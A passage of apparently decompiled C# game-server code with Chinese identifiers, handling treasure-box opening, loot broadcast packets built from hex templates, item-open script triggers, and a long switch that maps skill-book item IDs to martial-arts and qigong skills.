					RxjhClass.开盒记录(base.Userid, base.UserName, base.人物全服ID, open.FLD_PID, open.FLD_NAMEX, open.FLD_MAGIC1, open.FLD_MAGIC2, open.FLD_MAGIC3, open.FLD_MAGIC4, open.FLD_MAGIC5, base.人物坐标_地图, (int)base.人物坐标_X, (int)base.人物坐标_Y, "开盒");
					return;
				}
				减去物品(num2, 1);
				系统提示("没有获得任何物品", 50, "");
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "开箱 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 玩家从怪物身上获得物品(string 玩家名字, int 地图ID, int 怪物ID, int 物品ID)
		{
			string hex = "AA55BA0098000051B400010000000A0000002E0E00000200C05090650000D629031F00000000493C00000000000081000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(地图ID), 0, array, 26, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array, 30, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(怪物ID), 0, array, 38, 4);
			byte[] bytes = Encoding.Default.GetBytes(玩家名字);
			Buffer.BlockCopy(bytes, 0, array, 46, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			foreach (Players value in World.AllConnectedPlayers.Values)
			{
				value.Client.Send(array, array.Length);
			}
		}

		public void 玩家从宝盒里获得物品(string 玩家名字, int 宝盒物品ID, int 获得物品ID)
		{
			string hex = "AA55BA0098000051B400010000000A000000810900000200C05090650000D629031F00000000010000000000000081000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(获得物品ID), 0, array, 30, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(宝盒物品ID), 0, array, 38, 4);
			byte[] bytes = Encoding.Default.GetBytes(玩家名字);
			Buffer.BlockCopy(bytes, 0, array, 46, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			foreach (Players value in World.AllConnectedPlayers.Values)
			{
				value.Client.Send(array, array.Length);
			}
		}

		public void 使用封印宝箱提示信息(int 参数物品位置, int 参数提示信息)
		{
			string hex = "AA5522002C013B001C000112000083CD9A3B000000002C00000008000000000000000000000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(参数物品位置), 0, array, 11, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(参数提示信息), 0, array, 22, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[参数物品位置].Get物品数量), 0, array, 26, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 气功书(byte[] 封包数据)
		{
			try
			{
				if (base.Player死亡)
				{
					return;
				}
				int num = 封包数据[11];
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(封包数据, 14, array, 0, 4);
				Buffer.BlockCopy(封包数据, 26, array2, 0, 4);
				int num2 = BitConverter.ToInt32(array, 0);
				BitConverter.ToInt32(array2, 0);
				if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) != num2 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0 || !World.Itme.TryGetValue(num2, out var value))
				{
					return;
				}
				foreach (升天气功总类 value2 in World.升天气功List.Values)
				{
					if (value2.物品ID != num2)
					{
						continue;
					}
					if (value.FLD_LEVEL > base.Player_Level || (value.FLD_ZX != 0 && value.FLD_ZX != base.Player_Zx) || (value.FLD_RESIDE1 != 0 && value.FLD_RESIDE1 != base.Player_Job) || (value.FLD_JOB_LEVEL != 0 && value.FLD_JOB_LEVEL > base.Player_Job_leve))
					{
						break;
					}
					if (value.FLD_NEED_MONEY > 0 && base.Player_Money < value.FLD_NEED_MONEY)
					{
						系统提示("游戏币不够了。");
					}
					else
					{
						if (value.FLD_NEED_FIGHTEXP > 0 && base.Player_Money < value.FLD_NEED_FIGHTEXP)
						{
							break;
						}
						switch (base.Player_Job)
						{
						case 1:
							if (value2.人物职业1 == 0)
							{
								return;
							}
							break;
						case 2:
							if (value2.人物职业2 == 0)
							{
								return;
							}
							break;
						case 3:
							if (value2.人物职业3 == 0)
							{
								return;
							}
							break;
						case 4:
							if (value2.人物职业4 == 0)
							{
								return;
							}
							break;
						case 5:
							if (value2.人物职业5 == 0)
							{
								return;
							}
							break;
						case 6:
							if (value2.人物职业6 == 0)
							{
								return;
							}
							break;
						case 7:
							if (value2.人物职业7 == 0)
							{
								return;
							}
							break;
						case 8:
							if (value2.人物职业8 == 0)
							{
								return;
							}
							break;
						case 9:
							if (value2.人物职业9 == 0)
							{
								return;
							}
							break;
						case 10:
							if (value2.人物职业10 == 0)
							{
								return;
							}
							break;
						case 11:
							if (value2.人物职业11 == 0)
							{
								return;
							}
							break;
						case 12:
							if (value2.人物职业12 == 0)
							{
								return;
							}
							break;
						case 13:
							if (value2.人物职业13 == 0)
							{
								return;
							}
							break;
						}
						升天气功类 升天气功类2 = new 升天气功类
						{
							气功ID = value2.气功ID
						};
						if (!GetSTQG(升天气功类2.气功ID))
						{
							升天气功.Add(升天气功类2.气功ID, 升天气功类2);
							物品使用(1, num, 1);
							base.Player_Money -= value.FLD_NEED_MONEY;
							base.Player_ExpErience -= value.FLD_NEED_FIGHTEXP;
							学习技能提示();
							更新武功和状态();
							更新金钱和负重();
						}
					}
					break;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "气功书 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 打开物品触发器(byte[] data)
		{
			try
			{
				if (base.Player死亡)
				{
					return;
				}
				int num = data[11];
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(data, 14, array, 0, 4);
				Buffer.BlockCopy(data, 22, array2, 0, 4);
				int num2 = BitConverter.ToInt32(array, 0);
				int num3 = BitConverter.ToInt32(array2, 0);
				if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) != num2 || !World.Itme.TryGetValue(num2, out var _) || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0)
				{
					return;
				}
				try
				{
					if (World.脚本.打开物品事件 != null)
					{
						object[] args = new object[4]
						{
							base.人物全服ID,
							num2,
							num,
							BitConverter.ToInt32(装备栏包裹[num].物品数量, 0)
						};
						World.脚本.打开物品事件.Call(args);
					}
				}
				catch (Exception ex)
				{
					MainForm.WriteLine(2, "OpenItmeTrigGer(" + base.人物全服ID + ", " + num2 + ", " + num + ", " + BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) + ")");
					MainForm.WriteLine(2, "打开物品触发器1出错--" + ex.Message);
				}
			}
			catch (Exception ex2)
			{
				MainForm.WriteLine(2, "打开物品触发器2出错--" + ex2.Message);
			}
		}

		public void 四神变更提示(int 物品位置, int 道具ID, int 提示ID)
		{
			try
			{
				using 发包类 发包类 = new 发包类();
				发包类.Write1(1);
				发包类.Write1(物品位置);
				发包类.Write2(0);
				发包类.Write4(道具ID);
				发包类.Write4(0);
				发包类.Write4(提示ID);
				发包类.Write2(1);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 15104, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 武功书(byte[] 封包数据)
		{
			try
			{
				if (base.Player死亡 || 人物锁定)
				{
					return;
				}
				int num = 封包数据[10];
				int num2 = 封包数据[11];
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(封包数据, 14, array, 0, 4);
				Buffer.BlockCopy(封包数据, 22, array2, 0, 4);
				int num3 = BitConverter.ToInt32(array, 0);
				BitConverter.ToInt32(array2, 0);
				if (num == 60)
				{
					if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num2].物品ID, 0) == num3 && BitConverter.ToInt32(人物灵兽.宠物装备栏[num2].物品ID, 0) != 0)
					{
						goto IL_00f0;
					}
				}
				else if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == num3 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 0)
				{
					goto IL_00f0;
				}
				goto end_IL_0001;
				IL_00f0:
				if ((World.Itme.TryGetValue(num3, out var value) && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 0) || value.FLD_LEVEL > base.Player_Level || (value.FLD_ZX != 0 && value.FLD_ZX != base.Player_Zx) || (value.FLD_RESIDE1 != 0 && value.FLD_RESIDE1 != base.Player_Job) || (value.FLD_JOB_LEVEL != 0 && value.FLD_JOB_LEVEL > base.Player_Job_leve) || (value.FLD_NEED_FIGHTEXP > 0 && base.Player_ExpErience < value.FLD_NEED_FIGHTEXP))
				{
					return;
				}
				if (value.FLD_NEED_MONEY > 0 && base.Player_Money < value.FLD_NEED_MONEY)
				{
					系统提示("游戏币不够了。");
					return;
				}
				switch (num3)
				{
				case 1000000300:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000301:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000302:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000303:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000304:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000305:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000313:
					if (!武功类.检查修炼条件(this, 1, 17))
					{
						return;
					}
					武功类.学习武功书(this, 1, 17);
					break;
				case 1000000314:
					if (!武功类.检查修炼条件(this, 1, 18))
					{
						return;
					}
					武功类.学习武功书(this, 1, 18);
					break;
				case 1000000315:
					if (!武功类.检查修炼条件(this, 1, 21))
					{
						return;
					}
					武功类.学习武功书(this, 1, 21);
					break;
				case 1000000316:
					if (!武功类.检查修炼条件(this, 1, 22))
					{
						return;
					}
					武功类.学习武功书(this, 1, 22);
					break;
				case 1000000317:
					if (!武功类.检查修炼条件(this, 1, 23))
					{
						return;
					}
					武功类.学习武功书(this, 1, 23);
					break;
				case 1000000318:
				{
					武功类 wg2 = 武功类.GetWg(801401);
					if (wg2 != null)
					{
						if ((wg2.FLD_ZX != 0 && base.Player_Zx != wg2.FLD_ZX) || (wg2.FLD_JOB != 0 && base.Player_Job != wg2.FLD_JOB) || (wg2.FLD_JOBLEVEL != 0 && base.Player_Job_leve < wg2.FLD_JOBLEVEL) || (wg2.FLD_LEVEL != 0 && base.Player_Level < wg2.FLD_LEVEL))
						{
							return;
						}
						武功新[wg2.FLD_武功类型, wg2.FLD_INDEX] = new 武功类(wg2.FLD_PID);
					}
					break;
				}
				case 1000000320:
					if (!武功类.检查修炼条件(this, 1, 9))
					{
						return;
					}
					武功类.学习武功书(this, 1, 9);
					break;
				case 1000000200:
				{
					if (base.FLD_情侣.Length == 0)
					{
						return;
					}
					if (FLD_爱情度等级 > 4)
					{
						系统提示("爱情度等级达到4级以上才能修炼。");
						return;
					}
					if (是否已婚 != 1)
					{
						return;
					}
					int key = 0;
					if (base.Player_Job == 1)
					{
						key = 100301;
					}
					else if (base.Player_Job == 2)
					{
						key = 200301;
					}
					else if (base.Player_Job == 3)
					{
						key = 300301;
					}
					else if (base.Player_Job == 4)
					{
						key = 400301;
					}
					else if (base.Player_Job == 5)
					{
						key = 500301;
					}
					else if (base.Player_Job == 6)
					{
						key = 800301;
					}
					else if (base.Player_Job == 7)
					{
						key = 900301;
					}
					else if (base.Player_Job == 8)
					{
						key = 1000301;
					}
					else if (base.Player_Job == 9)
					{
						key = 2000301;
					}
					else if (base.Player_Job == 10)
					{
						key = 3000301;
					}
					else if (base.Player_Job == 11)
					{
						key = 4000301;
					}
					else if (base.Player_Job == 12)
					{
						key = 5000301;
					}
					else if (base.Player_Job == 13)
					{
						key = 6000301;
					}
					if (World.TBL_KONGFU.TryGetValue(key, out var value2))
					{
						武功新[value2.FLD_武功类型, value2.FLD_INDEX] = new 武功类(value2.FLD_PID);
						记算夫妻武功攻击力数据();
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num3, value.ItmeNAME, 1);
					break;
				}
				case 1000000213:
				{
					if (base.FLD_情侣.Length == 0)
					{
						return;
					}
					if (FLD_爱情度等级 > 4)
					{
						系统提示("爱情度等级达到4级以上才能修炼。");
						return;
					}
					if (是否已婚 != 1)
					{
						return;
					}
					int key2 = 0;
					if (base.Player_Sex == 1)
					{
						key2 = 601201;
					}
					else if (base.Player_Sex == 2)
					{
						key2 = 601202;
					}
					if (World.TBL_KONGFU.TryGetValue(key2, out var value3))
					{
						武功新[value3.FLD_武功类型, value3.FLD_INDEX] = new 武功类(value3.FLD_PID);
						记算夫妻武功攻击力数据();
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num3, value.ItmeNAME, 1);
					break;
				}
				case 1000000217:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000218:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000219:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000220:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000221:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000222:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000223:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000224:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000225:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000226:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000227:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000228:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000229:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000230:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000231:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000232:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000233:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000234:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000235:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000236:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000237:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000238:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000239:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000240:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000241:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000242:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000243:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000244:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000245:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000246:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000247:
					if (!武功类.检查修炼条件(this, 1, 5))
					{
						return;
					}
					武功类.学习武功书(this, 1, 5);
					break;
				case 1000000248:
					if (!武功类.检查修炼条件(this, 1, 5))
					{
						return;
					}
					武功类.学习武功书(this, 1, 5);
					break;
				case 1000000249:
					if (!武功类.检查修炼条件(this, 1, 13))
					{
						return;
					}
					武功类.学习武功书(this, 1, 13);
					break;
				case 1000001003:
					if (!武功类.检查修炼条件(this, 0, 23))
					{
						return;
					}
					武功类.学习武功书(this, 0, 23);
					武功类.学习武功书(this, 0, 24);
					break;
				case 1000001004:
					if (!武功类.检查修炼条件(this, 0, 19))
					{
						return;
					}
					武功类.学习武功书(this, 0, 19);
					break;
				case 1000001005:
					if (!武功类.检查修炼条件(this, 1, 9))
					{
						return;
					}
					武功类.学习武功书(this, 1, 9);
					break;
				case 1000001006:
					if (!武功类.检查修炼条件(this, 1, 12))
					{
						return;
					}
					武功类.学习武功书(this, 1, 12);
					break;
				case 1000001007:
					if (!武功类.检查修炼条件(this, 1, 14))
					{
						return;
					}
					武功类.学习武功书(this, 1, 14);
					break;
				case 1000001008:
					if (!武功类.检查修炼条件(this, 1, 17))
					{
						return;
					}
					武功类.学习武功书(this, 1, 17);
					break;
				case 1000001009:
					if (!武功类.检查修炼条件(this, 1, 5))
					{
						return;
					}
					武功类.学习武功书(this, 1, 5);
					break;
				case 1000001010:
					if (!武功类.检查修炼条件(this, 3, 15))
					{
						return;
					}
					武功类.学习武功书(this, 3, 13);
					武功类.学习武功书(this, 3, 14);
					武功类.学习武功书(this, 3, 15);
					break;
				case 1000001013:
					if (!武功类.检查修炼条件(this, 3, 16))
					{
						return;
					}
					武功类.学习武功书(this, 3, 16);
					武功类.学习武功书(this, 3, 17);
					break;
				case 1000001046:
					if (!武功类.检查修炼条件(this, 3, 13))
					{
						return;
					}
					武功类.学习武功书(this, 3, 13);
					break;
				case 1000001047:
					if (!武功类.检查修炼条件(this, 3, 18))
					{
						return;
					}
					武功类.学习武功书(this, 3, 18);
					武功类.学习武功书(this, 3, 19);
					break;
				case 1000001049:
					if (!武功类.检查修炼条件(this, 1, 25))
					{
						return;
					}
					武功类.学习武功书(this, 1, 25);
					break;
				case 1000001050:
					if (!武功类.检查修炼条件(this, 1, 13))
					{
						return;
					}
					武功类.学习武功书(this, 1, 13);
					break;
				case 1000000564:
					if (!武功类.检查修炼条件(this, 0, 19))
					{
						return;
					}
					武功类.学习武功书(this, 0, 19);
					break;
				case 1000000565:
				{
					武功类 wg = 武功类.GetWg(1010701);
					if (wg == null || (wg.FLD_ZX != 0 && base.Player_Zx != wg.FLD_ZX) || (wg.FLD_JOB != 0 && base.Player_Job != wg.FLD_JOB) || (wg.FLD_JOBLEVEL != 0 && base.Player_Job_leve < wg.FLD_JOBLEVEL) || (wg.FLD_LEVEL != 0 && base.Player_Level < wg.FLD_LEVEL))
					{
						return;
					}
					武功新[wg.FLD_武功类型, wg.FLD_INDEX] = new 武功类(wg.FLD_PID)
					{
						武功_等级 = 1
					};
					break;
				}
				case 1000000566:
				{
					武功类 wg3 = 武功类.GetWg(1020701);
					if (wg3 == null || (wg3.FLD_ZX != 0 && base.Player_Zx != wg3.FLD_ZX) || (wg3.FLD_JOB != 0 && base.Player_Job != wg3.FLD_JOB) || (wg3.FLD_JOBLEVEL != 0 && base.Player_Job_leve < wg3.FLD_JOBLEVEL) || (wg3.FLD_LEVEL != 0 && base.Player_Level < wg3.FLD_LEVEL))
					{
						return;
					}
					武功新[wg3.FLD_武功类型, wg3.FLD_INDEX] = new 武功类(wg3.FLD_PID)
					{
						武功_等级 = 1
					};
					break;
				}
				case 1000000567:
					if (!武功类.检查修炼条件(this, 3, 1))
					{
						return;
					}
					武功类.学习武功书(this, 3, 1);
					武功类.学习武功书(this, 1, 10);
					武功类.学习武功书(this, 3, 22);
					武功类.学习武功书(this, 3, 23);
					武功类.学习武功书(this, 3, 24);
					break;
				case 1000000568:
					if (!武功类.检查修炼条件(this, 3, 5))
					{
						return;
					}
					武功类.学习武功书(this, 3, 5);
					武功类.学习武功书(this, 1, 11);
					武功类.学习武功书(this, 1, 13);
					break;
				case 1000000569:
					if (!武功类.检查修炼条件(this, 3, 9))
					{
						return;
					}
					武功类.学习武功书(this, 3, 9);
					武功类.学习武功书(this, 1, 12);
					武功类.学习武功书(this, 1, 14);
					break;
				case 1000000570:
					if (!武功类.检查修炼条件(this, 1, 10))
					{
						return;
					}
					武功类.学习武功书(this, 1, 10);
					武功类.学习武功书(this, 1, 11);
					武功类.学习武功书(this, 1, 12);
					武功类.学习武功书(this, 1, 13);
					武功类.学习武功书(this, 1, 14);
					break;
				case 1000000488:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000489:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000490:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000491:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000000492:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000000493:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000001223:
					if (!武功类.检查修炼条件(this, 1, 17))
					{
						return;
					}
					武功类.学习武功书(this, 1, 17);
					武功类.学习武功书(this, 1, 18);
					break;
				case 1000001164:
					if (!武功类.检查修炼条件(this, 3, 1))
					{
						return;
					}
					武功类.学习武功书(this, 3, 1);
					武功类.学习武功书(this, 3, 2);
					武功类.学习武功书(this, 3, 3);
					break;
				case 1000001165:
					if (!武功类.检查修炼条件(this, 3, 5))
					{
						return;
					}
					武功类.学习武功书(this, 3, 5);
					武功类.学习武功书(this, 3, 6);
					break;
				case 1000001166:
					if (!武功类.检查修炼条件(this, 3, 9))
					{
						return;
					}
					武功类.学习武功书(this, 3, 9);
					武功类.学习武功书(this, 3, 10);
					break;
				case 1000001167:
					if (!武功类.检查修炼条件(this, 3, 13))
					{
						return;
					}
					武功类.学习武功书(this, 3, 13);
					武功类.学习武功书(this, 3, 14);
					break;
				case 1000001205:
					if (!武功类.检查修炼条件(this, 3, 17))
					{
						return;
					}
					武功类.学习武功书(this, 3, 17);
					break;
				case 1000001206:
					if (!武功类.检查修炼条件(this, 3, 20))
					{
						return;
					}
					武功类.学习武功书(this, 3, 20);
					武功类.学习武功书(this, 3, 21);
					break;
				case 1000001191:
				case 1000001192:
				case 1000001193:
				case 1000001194:
				case 1000001195:
				case 1000001196:
				case 1000001197:
				case 1000001198:
				case 1000001199:
				case 1000001200:
				case 1000001201:
				case 1000001202:
				case 1000001203:
				case 1000001204:
				case 1000001207:
				case 1000001208:
					if (!武功类.检查修炼条件(this, 3, 13))
					{
						return;
					}
					武功类.学习武功书(this, 3, 13);
					武功类.学习武功书(this, 3, 14);
					break;
				case 1000001209:
					if (!武功类.检查修炼条件(this, 3, 17))
					{
						return;
					}
					武功类.学习武功书(this, 3, 17);
					武功类.学习武功书(this, 3, 18);
					武功类.学习武功书(this, 3, 19);
					break;
				case 1000001210:
					if (!武功类.检查修炼条件(this, 3, 17))
					{
						return;
					}
					武功类.学习武功书(this, 3, 17);
					武功类.学习武功书(this, 3, 18);
					break;
				case 1000001100:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000001101:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					break;
				case 1000001102:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000001103:
					if (!武功类.检查修炼条件(this, 0, 26))
					{
						return;
					}
					武功类.学习武功书(this, 0, 26);
					break;
				case 1000001104:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000001105:
					if (!武功类.检查修炼条件(this, 0, 27))
					{
						return;
					}
					武功类.学习武功书(this, 0, 27);
					break;
				case 1000000336:
				case 1000000337:
				case 1000000338:
				case 1000000339:
				case 1000000340:
				case 1000000341:
				case 1000000342:
				case 1000000343:
				case 1000000344:
				case 1000000345:
				case 1000000346:
				case 1000000347:
				case 1000000494:
				case 1000000497:
				case 1000001106:
				case 1000001107:
					if (!武功类.检查修炼条件(this, 3, 1) || !武功类.检查修炼条件(this, 3, 2))
					{
						return;
					}
					武功类.学习武功书(this, 3, 1);
					武功类.学习武功书(this, 3, 2);
					break;
				case 1000000388:
				case 1000000389:
				case 1000000390:
				case 1000000391:
				case 1000000392:
				case 1000000393:
				case 1000000394:
				case 1000000395:
				case 1000000396:
				case 1000000397:
				case 1000000398:
				case 1000000399:
				case 1000000495:
				case 1000000498:
				case 1000001108:
				case 1000001109:
					if (!武功类.检查修炼条件(this, 3, 4) || !武功类.检查修炼条件(this, 3, 5))
					{
						return;
					}
					武功类.学习武功书(this, 3, 4);
					武功类.学习武功书(this, 3, 5);
					break;
				case 1000000464:
				case 1000000465:
				case 1000000466:
				case 1000000467:
				case 1000000468:
				case 1000000469:
				case 1000000470:
				case 1000000471:
				case 1000000472:
				case 1000000473:
				case 1000000474:
				case 1000000475:
				case 1000000496:
				case 1000000499:
				case 1000001110:
				case 1000001111:
					if (!武功类.检查修炼条件(this, 3, 7) || !武功类.检查修炼条件(this, 3, 8))
					{
						return;
					}
					武功类.学习武功书(this, 3, 7);
					武功类.学习武功书(this, 3, 8);
					break;
				case 1000001032:
				case 1000001033:
				case 1000001034:
				case 1000001035:
				case 1000001036:
				case 1000001037:
				case 1000001038:
				case 1000001039:
				case 1000001040:
				case 1000001041:
				case 1000001042:
				case 1000001043:
				case 1000001044:
				case 1000001045:
				case 1000001112:
				case 1000001113:
					if (!武功类.检查修炼条件(this, 3, 10) || !武功类.检查修炼条件(this, 3, 11))
					{
						return;
					}
					武功类.学习武功书(this, 3, 10);
					武功类.学习武功书(this, 3, 11);
					break;
				case 1000001532:
					if (!武功类.检查修炼条件(this, 3, 1))
					{
						return;
					}
					武功类.学习武功书(this, 3, 1);
					武功类.学习武功书(this, 3, 2);
					武功类.学习武功书(this, 3, 3);
					break;
				case 1000001533:
					if (!武功类.检查修炼条件(this, 3, 5))
					{
						return;
					}
					武功类.学习武功书(this, 3, 5);
					武功类.学习武功书(this, 3, 6);
					武功类.学习武功书(this, 3, 7);
					break;
				case 1000001534:
					if (!武功类.检查修炼条件(this, 3, 9))
					{
						return;
					}
					武功类.学习武功书(this, 3, 9);
					武功类.学习武功书(this, 3, 10);
					武功类.学习武功书(this, 3, 11);
					break;
				case 1000001535:
					if (!武功类.检查修炼条件(this, 3, 13))
					{
						return;
					}
					武功类.学习武功书(this, 3, 13);
					武功类.学习武功书(this, 3, 14);
					武功类.学习武功书(this, 3, 15);
					break;
				case 1000001284:
					if (!武功类.检查修炼条件(this, 3, 1))
					{
						return;
					}
					武功类.学习武功书(this, 3, 1);
					武功类.学习武功书(this, 3, 2);
					break;
				case 1000001285:
					if (!武功类.检查修炼条件(this, 0, 25))
					{
						return;
					}
					武功类.学习武功书(this, 0, 25);
					武功类.学习武功书(this, 0, 26);
					武功类.学习武功书(this, 0, 27);
					武功类.学习武功书(this, 0, 28);
					武功类.学习武功书(this, 0, 29);
					break;
				case 1000001286:
					if (!武功类.检查修炼条件(this, 3, 4))
					{
						return;
					}
					武功类.学习武功书(this, 3, 4);
					武功类.学习武功书(this, 3, 5);
					break;
				case 1000001287:
					if (!武功类.检查修炼条件(this, 3, 7))
					{
						return;
					}
					武功类.学习武功书(this, 3, 7);
					武功类.学习武功书(this, 3, 8);
					break;
				case 1000001288:
					if (!武功类.检查修炼条件(this, 3, 10))
					{
						return;
					}
					武功类.学习武功书(this, 3, 10);
					武功类.学习武功书(this, 3, 11);
					break;
				case 1000001289:
